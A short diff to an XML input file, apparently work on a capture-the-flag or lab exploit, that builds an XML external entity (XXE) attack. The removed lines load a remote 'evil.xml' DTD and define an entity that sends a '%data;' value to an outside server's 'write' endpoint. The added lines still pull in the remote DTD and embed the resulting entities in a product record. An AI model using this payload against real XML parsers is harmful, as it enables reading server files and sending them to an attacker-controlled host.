@@ -1,6 +1,10 @@
 <!DOCTYPE root[
-<!ENTITY % remove SYSTEM "https://vmstarchenko.github.io/s6/evil.xml">
-%remove;
-<!ENTITY % trik SYSTEM 'http://security-server.herokuapp.com/kekeke/write?y=%data;'>
-%trick;
+<!ENTITY % t0 SYSTEM "https://vmstarchenko.github.io/s6/evil.xml">
+%t0;
+%t2;
 ]>
+<input>&t3;</input>
+<product>
+  <name></name>
+  <price>600</price>
+</product>
